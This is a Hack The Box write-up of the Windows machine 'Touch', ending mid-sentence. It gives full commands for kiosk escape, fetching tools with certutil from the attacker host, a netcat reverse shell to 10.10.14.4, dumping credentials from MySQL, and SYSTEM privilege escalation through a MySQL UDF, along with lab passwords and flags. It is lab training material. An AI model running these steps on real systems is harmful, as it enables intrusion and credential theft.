# HTB Touch — Windows Kiosk Escape to SYSTEM

> **Platform:** Hack The Box  
> **Season:** Season 12 (as referenced in the supplied writeups)  
> **Operating System:** Windows  
> **Target IP used in this session:** `10.129.13.167`  
> **Kali VPN interface:** `tun0` — `10.10.14.4`  
> **Result:** User and Root flags retrieved; MySQL UDF execution confirmed as `NT AUTHORITY\SYSTEM`.

This write-up documents the complete path followed during the lab: reconnaissance, DeviceHub authentication, kiosk access, Windows command execution, MySQL enumeration, discovery of the MySQL root credential, and privilege escalation through a MySQL User-Defined Function (UDF).

**Lab-only notice:** The IP addresses, usernames, passwords, hashes, and flags below are from this HTB lab session. Do not reuse these credentials or techniques against systems without explicit authorization. The target IP and VPN address can change after a machine reset or VPN reconnection.

---

## Table of Contents

- [1. Attack Path Overview](#1-attack-path-overview)
- [2. Network Reconnaissance](#2-network-reconnaissance)
- [3. HTTP and API Enumeration](#3-http-and-api-enumeration)
- [4. DeviceHub Authentication](#4-devicehub-authentication)
- [5. Scanner API Inspection](#5-scanner-api-inspection)
- [6. RDP and Kiosk Access](#6-rdp-and-kiosk-access)
- [7. Kiosk Escape to Windows CMD](#7-kiosk-escape-to-windows-cmd)
- [8. Kali HTTP Server and Reverse Shell](#8-kali-http-server-and-reverse-shell)
- [9. Windows Enumeration](#9-windows-enumeration)
- [10. MySQL Application Database Enumeration](#10-mysql-application-database-enumeration)
- [11. MySQL Root Credential Discovery](#11-mysql-root-credential-discovery)
- [12. MySQL FILE Privilege and Plugin Directory](#12-mysql-file-privilege-and-plugin-directory)
- [13. MySQL UDF Privilege Escalation](#13-mysql-udf-privilege-escalation)
- [14. Flags](#14-flags)
- [15. Troubleshooting and Failed Attempts](#15-troubleshooting-and-failed-attempts)
- [16. Key Findings and Lessons Learned](#16-key-findings-and-lessons-learned)

---

## 1. Attack Path Overview

```text
Nmap reconnaissance
       |
       v
HTTP service on TCP/8443
       |
       v
DeviceHub login page and API enumeration
       |
       v
Device serial discovered from /api/status
       |
       v
DeviceHub authentication with serial number
       |
       v
Dashboard reveals KioskUser credentials
       |
       v
RDP access to the Windows kiosk
       |
       v
Scanner power-off workflow and browser transition
       |
       v
Windows CMD access through the kiosk browser
       |
       v
KioskUser command shell
       |
       v
MySQL application database enumeration
       |
       v
MySQL root password discovered in refresh-dates.bat
       |
       v
MySQL root account + FILE privilege
       |
       v
Writable MySQL plugin directory
       |
       v
lib_mysqludf_sys_64.dll + sys_eval UDF
       |
       v
NT AUTHORITY\SYSTEM
       |
       +------> user.txt
       |
       +------> root.txt
```

### Session information

| Item | Value |
|---|---|
| Target | `10.129.13.167` |
| Kali VPN interface | `tun0` |
| Kali VPN IP | `10.10.14.4` |
| DeviceHub web port | `8443/tcp` |
| RDP port | `3389/tcp` |
| WinRM port | `5985/tcp` |
| MySQL port (target-local) | `127.0.0.1:3306` |
| MySQL X Protocol port | `33060` |
| Kali HTTP server port | `9000` |
| Reverse-shell listener port | `9090` |

---

## 2. Network Reconnaissance

The initial full TCP scan identified four open ports.

### 2.1 Full port scan

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.129.13.167
```

Observed result:

```text
PORT     STATE SERVICE
135/tcp  open  msrpc
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8443/tcp open  https-alt
```

### 2.2 Service and default-script scan

```bash
nmap -sV -sC -Pn -p- 10.129.13.167
```

Relevant findings:

```text
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The web service on port `8443` returned the Nexion DeviceHub login page. Although Nmap labels the port `https-alt`, the HTTP requests used in this session were sent with `http://` and received valid responses.

---

## 3. HTTP and API Enumeration

### 3.1 Web content discovery

The common SecLists wordlist was used to discover top-level paths:

```bash
ffuf -u http://10.129.13.167:8443/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s
```

Discovered paths:

```text
api
favicon.ico
login
```

The API namespace was enumerated separately:

```bash
ffuf -u http://10.129.13.167:8443/api/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s
```

Discovered endpoints:

```text
scan
status
```

The resulting paths were:

```text
/api/scan
/api/status
```

### 3.2 Inspect the login page

```bash
curl http://10.129.13.167:8443/login
```

The login form contained a single password field:

```html
<form method="POST" action="/login">
  <input type="password" name="password" placeholder="Device password" required>
</form>
```

The page also disclosed a useful hint in its HTML:

```html
<div class="login-hint"
     title="The default password is the device serial number included in your DeviceHub packaging.">
  Forgot your password?
</div>
```

This suggested that the DeviceHub serial number was also the default login password.

### 3.3 Retrieve device status and serial number

```bash
curl -sS -i 'http://10.129.13.167:8443/api/status'
```

Observed JSON response:

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 81173
}
```

The important value was:

```text
NX-DH-2024-B7042
```

---

## 4. DeviceHub Authentication

The serial number was submitted to the login endpoint. The `-c` option saved the returned session cookie to `touch_cookies.txt`.

```bash
curl -sS -i \
  -c touch_cookies.txt \
  -X POST 'http://10.129.13.167:8443/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'password=NX-DH-2024-B7042'
```

Observed response:

```text
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: nxsession=<session-value>; Path=/
```

The cookie file was then present in the working directory:

```bash
ls
```

`touch_cookies.txt` appeared in the output.

### 4.1 Verify the authenticated session

```bash
curl -sS -i -b touch_cookies.txt \
  'http://10.129.13.167:8443/dashboard'
```

The dashboard returned `HTTP/1.1 200 OK` and exposed the kiosk account credentials in its HTML. The credentials were also visible through the page's “show” controls.

Credentials shown by the dashboard:

```text
Username: KioskUser
Password: K!0sk2026#
```

The same credentials were displayed on the scanner page.

---

## 5. Scanner API Inspection

### 5.1 Download the last scan capture

An initial command used `-i` with `-o`:

```bash
curl -i -b touch_cookies.txt \
  "http://10.129.13.167:8443/api/scan/last-capture" \
  -o lastcap.bin
```

This saved the HTTP response headers and image body together. The first bytes of `lastcap.bin` therefore contained the HTTP response:

```text
HTTP/1.1 200 OK
Content-Type: image/jpeg
...
```

The JPEG data began after the HTTP headers. A cleaner download stored headers and the image separately:

```bash
curl -sS -b touch_cookies.txt \
  -D lastcap.headers \
  -o lastcap.jpg \
  'http://10.129.13.167:8443/api/scan/last-capture'
```

Verify the image:

```bash
file lastcap.jpg
xxd -l 16 lastcap.jpg
```

Observed result:

```text
lastcap.jpg: JPEG image data, JFIF standard 1.01, ... 640x480, components 3
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060
```

The `FFD8 FFE0` signature confirmed that the saved file was a JPEG image. The image dimensions were `640x480`.

Other inspection commands used during the capture analysis:

```bash
wc -c lastcap.bin
xxd lastcap.bin | head -30
```

### 5.2 Update scanner settings with a marker

The scanner settings endpoint accepted a JSON PUT request:

```bash
curl -s -b touch_cookies.txt \
  -X PUT 'http://10.129.13.167:8443/api/scanner/settings' \
  -H 'Content-Type: application/json' \
  -d '{"resolution":"XSSPROBE123","format":"JPEG","mrzDetection":true,"autoCalibrate":true}'
```

Observed response after authentication:

```json
{"success":true}
```

The scanner page was checked for the marker:

```bash
curl -s -b touch_cookies.txt \
  'http://10.129.13.167:8443/scanner' | grep -i 'XSSPROBE123'
```

No matching line was returned. Therefore, the marker was not observed in the downloaded scanner HTML. This test alone did **not** establish an XSS vulnerability.

### 5.3 Test a proto-style JSON object

The following JSON request was also submitted:

```bash
curl -i -b touch_cookies.txt \
  -X PUT 'http://10.129.13.167:8443/api/scanner/settings' \
  -H 'Content-Type: application/json' \
  -d '{"proto":{"admin":true,"isAdmin":true,"role":"admin"}}'
```

After the authenticated session had been created, the response was:

```text
HTTP/1.1 200 OK
Content-Type: application/json
...
{"success":true}
```

This proves that the endpoint accepted the request. It does not, by itself, prove that the request changed the user's authorization role or granted additional privileges.

### 5.4 Dashboard and scanner page verification

A typo was initially used (`/deshboard`). The correct dashboard path was `/dashboard`:

```bash
curl -sS -i -b touch_cookies.txt \
  'http://10.129.13.167:8443/dashboard'
```

Search the dashboard HTML for the admin activity entry:

```bash
curl -sS -i -b touch_cookies.txt \
  'http://10.129.13.167:8443/dashboard' | grep -i 'admin'
```

The returned HTML included:

```text
Admin login successful
```

The scanner page was also retrieved:

```bash
curl -sS -i -b touch_cookies.txt \
  'http://10.129.13.167:8443/scanner'
```

The page exposed scanner information and contained a **Power Off** control that called:

```javascript
api('/api/scanner/power','POST',{powered:false})
```

The dashboard HTML similarly showed the KioskUser credentials and a scanner Power Off button.

---

## 6. RDP and Kiosk Access

The dashboard credentials were used to access the Windows kiosk over RDP.

```bash
xfreerdp /v:10.129.13.167 \
  /u:KioskUser \
  /p:'K!0sk2026#' \
  /cert:ignore \
  /dynamic-resolution
```

FreeRDP printed a warning that using `/p` exposes the password through command-line arguments. It also printed an `SSL_NOT_ALLOWED_BY_SERVER` negotiation warning, but the session proceeded to initialize the remote display. Some later sessions were disconnected by the remote host or manually interrupted with `Ctrl+C`.

### 6.1 Booking information from the machine hint

The machine hint supplied the following booking information from the preceding Layover machine:

```text
Passenger: Jenny Crawford
Booking reference: KS7X2M
```

The Kiosk LOOKUP page was tested with:

```text
Booking Reference: KS7X2M
Last Name: Crawford
```

In the observed UI attempt, the page displayed **Booking not found**. The supplied writeups describe this booking flow as leading to the passport scanning page, but the actual session log records the failed lookup. The later scanner/kiosk workflow was still accessible and was used to continue the machine.

### 6.2 Scanner Power Off and kiosk browser workflow

The supplied walkthrough describes the following sequence:

1. Return to the Touch kiosk screen.
2. Open the DeviceHub scanner page.
3. Press **Power Off** for the scanner.
4. Return to the kiosk and select **Scan Passport**.
5. Observe the resulting scanner error and follow the link provided by the error page.
6. In the browser opened by that link, press `Ctrl+O` and enter the Windows command interpreter path.

The path used was:

```text
C://Windows//System32//cmd.exe
```

This produced access to a Windows CMD prompt running as the kiosk user. The command prompt prompt shown later in the session was:

```text
C:\Users\KioskUser\Downloads>
```

> **Reproduction note:** The booking lookup attempt returned “Booking not found” in this session. Do not describe that particular lookup as successful. The scanner Power Off → Scan Passport → browser transition → CMD workflow is the kiosk escape path recorded in the supplied walkthrough and used to obtain Windows command execution.

---

## 7. Kiosk Escape to Windows CMD

Once the Windows command prompt was available, the initial identity checks were run:

```cmd
whoami
hostname
whoami /priv
```

Observed identity:

```text
kiosk-042\kioskuser
```

Observed hostname:

```text
KIOSK-042
```

Relevant privilege output:

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The current account did not show `SeImpersonatePrivilege` in this output.

---

## 8. Kali HTTP Server and Reverse Shell

A reverse shell was used to make command execution easier to manage from Kali. The Kali VPN address was `10.10.14.4`.

### 8.1 Verify the VPN interface and address

```bash
ifconfig
```

The relevant interface was:

```text
tun0
inet 10.10.14.4
```

A more focused check was also run:

```bash
ip -4 addr show tun0
```

Observed result:

```text
inet 10.10.14.4/23
```

### 8.2 Prepare the Windows Netcat binary

On Kali:

```bash
mkdir -p /tmp/touch-share
cp /usr/share/windows-resources/binaries/nc.exe /tmp/touch-share/
cd /tmp/touch-share
ls -lh nc.exe
```

Observed size:

```text
-rwxr-xr-x 1 root root 58K ... nc.exe
```

### 8.3 Start the HTTP server

From `/tmp/touch-share`:

```bash
python3 -m http.server 9000
```

The server listened on all interfaces:

```text
Serving HTTP on 0.0.0.0 port 9000
```

Verify the listener from another Kali terminal:

```bash
ss -lntp | grep ':9000'
```

Observed result:

```text
LISTEN 0 5 0.0.0.0:9000 0.0.0.0:* users:("python3",pid=74352,fd=3)
```

Local HTTP test:

```bash
curl -I http://127.0.0.1:9000/nc.exe
```

Observed response:

```text
HTTP/1.0 200 OK
Content-type: application/x-msdos-program
Content-Length: 59392
```

The HTTP server process working directory was also checked with:

```bash
readlink -f /proc/74352/cwd
```

### 8.4 Download Netcat from Windows

From the Windows CMD prompt:

```cmd
curl.exe -I http://10.10.14.4:9000/nc.exe
```

The Windows target received `HTTP/1.0 200 OK` and `Content-Length: 59392`.

Download the file:

```cmd
certutil.exe -urlcache -split -f http://10.10.14.4:9000/nc.exe "%USERPROFILE%\Downloads\nc.exe"
```

An equivalent command used in the session was:

```cmd
certutil.exe -urlcache -split -f http://10.10.14.4:9000/nc.exe nc.exe
```

The downloaded file was verified with:

```cmd
dir /a nc.exe
```

The observed file size was `59,392` bytes.

### 8.5 Start the reverse-shell listener

On Kali, in a separate terminal:

```bash
nc -lvnp 9090
```

From the Windows CMD prompt in the Downloads directory:

```cmd
nc.exe -e cmd.exe 10.10.14.4 9090
```

The Kali listener received a connection from the target:

```text
connect to [10.10.14.4] from (UNKNOWN) [10.129.13.167] <ephemeral-port>
```

The resulting shell was a Windows command prompt as:

```text
kiosk-042\kioskuser
```

### 8.6 Optional file-hash verification commands

These commands were suggested to compare the local and downloaded binary hashes:

On Kali:

```bash
sha256sum /tmp/touch-share/nc.exe
```

On Windows:

```cmd
certutil -hashfile "%USERPROFILE%\Downloads\nc.exe" SHA256
```

The session established the successful download by HTTP status and file size; no matching hash output was recorded.

---

## 9. Windows Enumeration

### 9.1 Confirm the shell identity

```cmd
whoami
hostname
whoami /priv
```

Results:

```text
kiosk-042\kioskuser
KIOSK-042
```

### 9.2 Find the MySQL listener

```cmd
netstat -ano | findstr :3306
```

Observed result:

```text
TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING       3564
TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       3564
TCP    127.0.0.1:3306         127.0.0.1:60101        ESTABLISHED     3564
TCP    127.0.0.1:60101        127.0.0.1:3306         ESTABLISHED     5756
TCP    [::]:33060             [::]:0                 LISTENING       3564
```

The MySQL server process ID was `3564`.

### 9.3 Inspect the application's database source

The application source file was located at:

```text
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts
```

Directory listing:

```cmd
dir "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database"
```

Read the file:

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

Important source snippet:

```typescript
const DB_CONFIG_PATH = process.env.DB_CONFIG_PATH || "C:\\ProgramData\\HTB Airways\\db-config.ini";

function loadConfig(): { host: string; port: number; user: string; password: string; database: string } {
  const defaults = {
    host: "127.0.0.1",
    port: 3306,
    user: "kiosk_app",
    password: "K!0sk_R3pl1ca#DB",
    database: "htb_airways"
  };
```

The complete source also showed that the application reads `db-config.ini` when possible and falls back to these defaults if loading the file fails.

The configuration file itself was not readable as KioskUser:

```cmd
type "C:\ProgramData\HTB Airways\db-config.ini"
```

Observed result:

```text
Access is denied.
```

### 9.4 Locate the MySQL executable

```cmd
dir C:\MySQL\bin\mysql.exe
```

Observed file:

```text
C:\MySQL\bin\mysql.exe
Size: 7,127,104 bytes
```

The following command was also tried:

```cmd
where mysql
```

The full path was used for subsequent MySQL commands to avoid PATH ambiguity.

---

## 10. MySQL Application Database Enumeration

The application source disclosed the default application database credentials:

```text
Username: kiosk_app
Password: K!0sk_R3pl1ca#DB
Host: 127.0.0.1
Port: 3306
Database: htb_airways
```

### 10.1 Initial interactive login attempt

The interactive command was attempted:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p -h 127.0.0.1 -P 3306
```

The interactive client did not behave usefully through the basic Netcat shell, so non-interactive `-e` queries were used instead.

### 10.2 List databases

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SHOW DATABASES;"
```

Observed databases:

```text
htb_airways
information_schema
performance_schema
```

### 10.3 List tables

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SHOW TABLES;"
```

Observed tables:

```text
_htb_staff
_sync_metadata
boarding_passes
booking_passengers
bookings
checkin_log
document_scans
flights
passengers
seat_assignments
```

### 10.4 Inspect the staff table schema

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SHOW COLUMNS FROM _htb_staff;"
```

Observed columns:

| Field | Type | Null | Key | Default | Extra |
|---|---|---|---|---|---|
| id | int | NO | PRI | NULL | auto_increment |
| employee_id | varchar(20) | NO | UNI | NULL | |
| first_name | varchar(100) | NO | | NULL | |
| last_name | varchar(100) | NO | | NULL | |
| email | varchar(255) | NO | | NULL | |
| auth_code | varchar(64) | YES | | NULL | |
| role | varchar(100) | NO | | NULL | |
| department | varchar(100) | YES | | NULL | |
| badge_number | varchar(20) | YES | | NULL | |
| base_airport | varchar(10) | YES | | NULL | |
| hire_date | date | YES | | NULL | |
| phone_ext | varchar(10) | YES | | NULL | |
| active | tinyint | YES | | 1 | |
| last_login | datetime | YES | | NULL | |
| notes | text | YES | | NULL | |

### 10.5 Retrieve staff records

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

Observed records:

| Employee ID | Email | Auth code | Role | Active |
|---|---|---|---|---:|
| HTB-97248 | mmitchell@htbairways.htb | 4601947A40E4BDCE | Cargo Supervisor | 1 |
| HTB-80469 | ekovacs@htbairways.htb | D4E96DB85AECAFC4 | First Officer | 1 |
| HTB-98398 | dandersen@htbairways.htb | 255160EA80AF52CC | Senior Check-in Agent | 1 |
| HTB-25469 | snakamura@htbairways.htb | 65BBA59D1B5145E7 | First Officer | 1 |
| HTB-76155 | jokonkwo@htbairways.htb | EA42FAB8CAE50D63 | Maintenance Technician | 1 |
| HTB-38997 | pbergstrm@htbairways.htb | D531E04C42758846 | Check-in Agent | 1 |
| HTB-66373 | tsantos@htbairways.htb | DBEA8BF35F3B93A3 | Aviation Security Lead | 1 |
| HTB-58295 | mpatel@htbairways.htb | E624511D7FD0A720 | Customer Service Agent | 1 |
| HTB-98600 | cdubois@htbairways.htb | 88123126BC55AC23 | Duty Manager | 1 |
| HTB-34325 | fkim@htbairways.htb | 60F90262004EF01F | Gate Agent | 1 |
| HTB-43955 | rhoffmann@htbairways.htb | AD59D674FEE120D4 | Revenue Management Analyst | 1 |
| HTB-45332 | atorres@htbairways.htb | 5E029161F6ECE1A9 | Quality Assurance Inspector | 1 |
| HTB-15827 | wivanova@htbairways.htb | 43F718B0397FFDF5 | Operations Manager | 1 |
| HTB-54598 | yyamamoto@htbairways.htb | BFDD344882B28674 | Operations Manager | 1 |
| HTB-75142 | aalrashid@htbairways.htb | B0E5D6C0675DC6DC | Security Screening Officer | 1 |
| HTB-24441 | olindberg@htbairways.htb | 1871D8DE90E9135B | Check-in Supervisor | 1 |
| HTB-89426 | smller@htbairways.htb | DFD0F7A09BFC9351 | Baggage Handler | 1 |
| HTB-73230 | nfernandez@htbairways.htb | 48E3CA097528E009 | Ticketing Agent | 1 |
| HTB-12142 | pjohansson@htbairways.htb | CC1C6384C79F8486 | Safety Officer | 1 |
| HTB-11937 | zchen@htbairways.htb | 7BF959E12104A59B | Flight Engineer | 1 |
| HTB-58317 | mmcallister@htbairways.htb | A653E3DEECCBDBCE | Customer Service Agent | 1 |
| HTB-34190 | cpetrov@htbairways.htb | 9C70CBAA6540797E | Terminal Coordinator | 1 |
| HTB-21796 | bgonzalez@htbairways.htb | 65D6F6CED43D3C2E | Line Maintenance Supervisor | 1 |
| HTB-97223 | ltanaka@htbairways.htb | 6348DC443E0883A9 | Line Maintenance Supervisor | 1 |
| HTB-31181 | aibrahim@htbairways.htb | B678BB6055ACE81F | Station Manager | 1 |
| HTB-18972 | snielsen@htbairways.htb | A172D8EA101681AE | Check-in Supervisor | 1 |
| HTB-15335 | kweber@htbairways.htb | E5AEFED3F2EEA35F | First Officer | 1 |
| HTB-23411 | amartinez@htbairways.htb | B53951FF8C7B63CE | Lounge Manager | 1 |
| HTB-35391 | lsuzuki@htbairways.htb | 7DD9286F5DC8B104 | Ticketing Agent | 1 |
| HTB-98705 | ehassan@htbairways.htb | F83329B17B0C0E83 | Customer Service Agent | 1 |
| HTB-37522 | deriksson@htbairways.htb | 644D5E009C35E316 | Safety Officer | 1 |
| HTB-58288 | isilva@htbairways.htb | B95FB54E61B9B4AC | Station Manager | 1 |

### 10.6 Check application account grants

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SHOW GRANTS;"
```

Observed grants:

```sql
GRANT USAGE ON *.* TO `kiosk_app`@`localhost`
GRANT ALL PRIVILEGES ON `htb_airways`.* TO `kiosk_app`@`localhost`
```

The application account had all privileges on the `htb_airways` database, but it could not read the server-level `mysql.user` table.

The following query was attempted:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SELECT user,host,File_priv FROM mysql.user WHERE user='root';"
```

Observed result:

```text
ERROR 1142 (42000): SELECT command denied to user 'kiosk_app'@'localhost' for table 'user'
```

This was an expected permission boundary for the lower-privileged application account.

---

## 11. MySQL Root Credential Discovery

The following directory was enumerated:

```cmd
dir "C:\ProgramData\HTB Airways" /a
```

Observed files:

```text
C:\ProgramData\HTB Airways\db-config.ini
C:\ProgramData\HTB Airways\db-sync-replica.ps1
C:\ProgramData\HTB Airways\refresh-dates.bat
C:\ProgramData\HTB Airways\refresh-dates.sql
```

A recursive listing was also performed:

```cmd
dir "C:\ProgramData\HTB Airways" /s /b
```

The `refresh-dates.bat` script was readable:

```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

Its contents were:

```bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

This exposed the MySQL root credential used by the scheduled/manual maintenance script:

```text
Username: root
Password: HTB@irw4ys_DB!2026
```

### 11.1 Verify MySQL root authentication

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT USER(), CURRENT_USER();"
```

Observed result:

```text
USER()          CURRENT_USER()
root@localhost  root@localhost
```

This confirmed authentication as the MySQL root account.

---

## 12. MySQL FILE Privilege and Plugin Directory

### 12.1 Check the MySQL root FILE privilege

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT user,host,File_priv FROM mysql.user WHERE user='root';"
```

Observed result:

```text
user  host      File_priv
root  localhost Y
```

The MySQL root account had the `FILE` privilege.

### 12.2 Identify the MySQL plugin directory

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SHOW VARIABLES LIKE 'plugin_dir';"
```

Observed result:

```text
Variable_name  Value
plugin_dir     C:\\MySQL\\lib\\plugin\\
```

The resolved Windows path was:

```text
C:\MySQL\lib\plugin\
```

### 12.3 Inspect Windows ACLs on the plugin directory

```cmd
icacls "C:\MySQL\lib\plugin"
```

Observed permissions:

```text
C:\MySQL\lib\plugin BUILTIN\Administrators:(I)(OI)(CI)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                    BUILTIN\Users:(I)(OI)(CI)(RX)
                    NT AUTHORITY\Authenticated Users:(I)(M)
                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Important permission meanings:

| ACL flag | Meaning |
|---|---|
| `F` | Full Control |
| `M` | Modify |
| `RX` | Read and Execute |
| `I` | Inherited |
| `OI` | Object Inherit |
| `CI` | Container Inherit |
| `IO` | Inherit Only |

The important finding was that `Authenticated Users` had `Modify` permission on the plugin directory. The DLL was subsequently written to this directory successfully.

### 12.4 MySQL process inspection attempts

The process associated with PID `3564` was checked:

```cmd
tasklist /svc /FI "PID eq 3564"
```

Observed output:

```text
Image Name  PID   Services
mysqld.exe  3564  N/A
```

A PowerShell service query was attempted:

```cmd
powershell -NoProfile -Command "Get-CimInstance Win32_Service | Where-Object { $_.ProcessId -eq 3564 } | Format-List Name,DisplayName,StartName,State,PathName"
```

No output was returned by that query in the session. The later UDF execution test directly established the effective command execution identity.

---

## 13. MySQL UDF Privilege Escalation

The UDF route used a Windows x64 MySQL system-function DLL. A MySQL UDF is a User-Defined Function implemented by a shared library; in this case, the Windows DLL exported the `sys_eval` function used by the walkthrough.

### 13.1 Locate and inspect the DLL on Kali

```bash
ls -lh /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

Observed size:

```text
-rwxr-xr-x 1 root root 7.0K ... lib_mysqludf_sys_64.dll
```

Check its architecture and file type:

```bash
file /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

Observed result:

```text
PE32+ executable for MS Windows 5.02 (DLL), x86-64, 3 sections
```

Copy the DLL into the HTTP server directory:

```bash
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll /tmp/touch-share/
```

### 13.2 Verify the HTTP server can serve the DLL

The HTTP server was run from `/tmp/touch-share`:

```bash
cd /tmp/touch-share
python3 -m http.server 9000
```

Verify the file locally:

```bash
ls -lh /tmp/touch-share/lib_mysqludf_sys_64.dll
curl -I http://127.0.0.1:9000/lib_mysqludf_sys_64.dll
```

The server returned HTTP `200 OK`. The expected DLL size was `7,168` bytes.

### 13.3 Transfer the DLL to the target plugin directory

From Windows CMD:

```cmd
certutil.exe -urlcache -split -f http://10.10.14.4:9000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Observed response:

```text
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
```

Verify the copied file:

```cmd
dir C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Observed result:

```text
lib_mysqludf_sys_64.dll  7,168 bytes
```

### 13.4 Register the UDF

Using the MySQL root credential, the UDF was registered:

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

No SQL error was returned, indicating that the function registration succeeded.

### 13.5 Verify operating-system command execution

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('whoami');"
```

Observed output:

```text
sys_eval('whoami')
nt authority\\system
```

This was the decisive privilege-escalation result: commands invoked through the MySQL UDF were executed as `NT AUTHORITY\SYSTEM`.

### 13.6 Read the Root flag

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

Observed flag output:

```text
c7caf2fdfe0a1571c8954b16ede7ec7f
```

The Administrator Desktop listing was also checked:

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('dir C:\\Users\\Administrator\\Desktop');"
```

The listing showed `root.txt` with a size of 34 bytes.

### 13.7 Read the User flag

The KioskUser Desktop was enumerated through the same SYSTEM-level UDF:

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('dir C:\\Users\\KioskUser\\Desktop');"
```

The listing showed `user.txt` with a size of 34 bytes.

Read it:

```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('type C:\\Users\\KioskUser\\Desktop\\user.txt');"
```

Observed flag output:

```text
a828f9125fd7b1c2f986dcbdc808f84f
```

---

## 14. Flags

Both flag files were successfully read during the lab session.

| Flag | File | Retrieved value |
|---|---|---|
| User | `C:\Users\KioskUser\Desktop\user.txt` | `a828f9125fd7b1c2f986dcbdc808f84f` |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `c7caf2fdfe0a1571c8954b16ede7ec7f` |

Submit each value in its corresponding User and Root field on the HTB machine page.

---

## 15. Troubleshooting and Failed Attempts

This section preserves the issues encountered during the session and the commands that corrected them.

### 15.1 Smart quotes in copied commands

Some commands were copied with typographic quotation marks such as `“ ”` or `‘ ’`. Curl interpreted these as literal Unicode characters and rejected the URL or split the header/data arguments.

Incorrect example:

```bash
curl -i -b touch_cookies.txt “http://10.129.13.167:8443/api/scan/last-capture” -o lastcap.bin
```

Correct example using ordinary ASCII quotes:

```bash
curl -i -b touch_cookies.txt "http://10.129.13.167:8443/api/scan/last-capture" -o lastcap.bin
```

Use normal ASCII quotes in shell commands and JSON.

### 15.2 `-i` saved HTTP headers inside the image file

The command below includes response headers in the output stream:

```bash
curl -i -b touch_cookies.txt "http://10.129.13.167:8443/api/scan/last-capture" -o lastcap.bin
```

For a clean image body with headers saved separately, use:

```bash
curl -sS -b touch_cookies.txt \
  -D lastcap.headers \
  -o lastcap.jpg \
  'http://10.129.13.167:8443/api/scan/last-capture'
```

### 15.3 Missing cookie file and HTTP 302 redirect

Before logging in, the file did not exist:

```bash
ls -lh touch_cookies.txt
```

Observed result:

```text
ls: cannot access 'touch_cookies.txt': No such file or directory
```

A protected PUT request at that stage returned:

```text
